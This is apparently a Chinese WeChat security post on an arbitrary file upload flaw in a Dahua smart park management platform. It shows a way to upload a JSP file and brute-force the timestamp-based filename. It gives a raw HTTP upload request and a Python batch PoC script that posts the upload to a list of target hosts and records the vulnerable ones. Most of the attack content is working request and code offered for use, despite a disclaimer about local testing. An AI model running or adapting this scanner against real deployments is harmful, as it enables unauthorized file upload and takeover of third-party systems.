> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/k_sloI1n22YEbRv5hR6eKg)

  

  

**Max 是你安全路上的一盏明灯**

  

  

  

前言
==

本公众号仅用作技术研究，利用此文提及到的知识造成的**任何直接或者间接的后果及损失****，**均由使用者本人负责，本人**不为此承担任何责任**，**本文中涉及的漏洞复现，均是自己搭建的本地靶场，禁止非法攻击未授权站点****。**

漏洞描述
====

某华智慧园区综合管理平台存在漏洞，攻击者可以通过接口任意上传文件，导致系统被攻击与控制。

漏洞复现
====

第一个点
----

上传压缩包功能处，存在任意文件上传

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SvjWNykfVjibKRuuFicgNiaPibBzPicWZWmGDqGl1Fs5icE9vwiaGBzJQjtgTN6Czw2MO51M82jR6KjWA0lGLC3HZEtdA/640?wx_fmt=png)

文件保存路径为 / facePic/yyyy-MM-dd/，例如：/facePic/2023-07-09/，文件名命名规则为时间戳 + 3 位随机数 + 后缀，例如：20220509071212907，并且在解压文件前就执行了文件写入操作。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SvjWNykfVjibKRuuFicgNiaPibBzPicWZWmGDf8sNZpLOhnkqyiagrazbgu8QVvbHp5xRcuylEhJyLicwEK5tFDvJR3ibQ/640?wx_fmt=png)

所以我们可以直接传一个 jsp 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SvjWNykfVjibKRuuFicgNiaPibBzPicWZWmGDo8ibqlCVstpxicQ8bfRgO8HfhpaynKL37MRck3Qsqp7v5O1nICc8ew2Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/SvjWNykfVjibKRuuFicgNiaPibBzPicWZWmGDv8s9xFb4HFwZA3sIyhzECdGKFhQjtjRbVVsfVmaiaaibtw9UPrsNd8Ew/640?wx_fmt=png)

文件名可以通过爆破上传附近时间点的时间戳 + 100-999 的 3 位随机数来获取。

第二个点
----

```
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Content-Type: multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 243
Connection: close
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; 
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary
123
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--

```

上传路径：  
http://ip:8314/upload/emap/society_new/ico... 随机字符串_on.jsp  
注：301 重定向改变了端口

```
import argparse
import time
import requests
parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台任意文件上传 批量PoC')
parser.add_argument('-f',help='Batch detection file name',type=str)
args = parser.parse_args()
file = args.f
def get_url(file):
    with open('{}'.format(file),'r',encoding='utf-8') as f:
        for i in f:
            i = i.replace('\n', '')
            send_req("http://"+i)
def write_result(content):
    f = open("result.txt", "a", encoding="UTF-8")
    f.write('{}\n'.format(content))
    f.close()
def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/emap/devicePoint_addImgIco?hasSubsystem=true'
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type':'multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT',
        'Accept':'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection':'close'
    }
    data = (
        "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\n"
        'Content-Disposition: form-data; \r\n'
        "Content-Type: application/octet-stream\r\n"
        "Content-Transfer-Encoding: binary\r\n"
        "\r\n"
        "123\r\n"
        "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--"
    )
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url,headers=header,data=data,verify=False,timeout=3).json()
        if response['code'] == 1:
            result = '{} 存在任意文件上传漏洞! 请访问目标自测：{} \n'.format(url_check,
                                                            url_check + "/upload/emap/society_new/" + response['data'])
            print(result)
            write_result(result)
        time.sleep(1)
    except Exception as e:
        print(e)
        pass
if __name__ == '__main__':
    if file is None:
        print('请在当前目录下新建需要检测的url.txt')
    else:
        get_url(file)

```

工具
==

使用方法：

1.  把需要检测的 url 放入 txt 文档中
    
2.  执行 python 脚本 -f url.txt
    
3.  检测出有任意文件上传漏洞的资产会保存在同目录 result.txt 文件中
    

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/SvjWNykfVjibKRuuFicgNiaPibBzPicWZWmGDcHcBVM7QgCz9lS41HvPSrnk2ttDCQXq2pWhyepDRFzgnzeVibaPXSBA/640?wx_fmt=gif)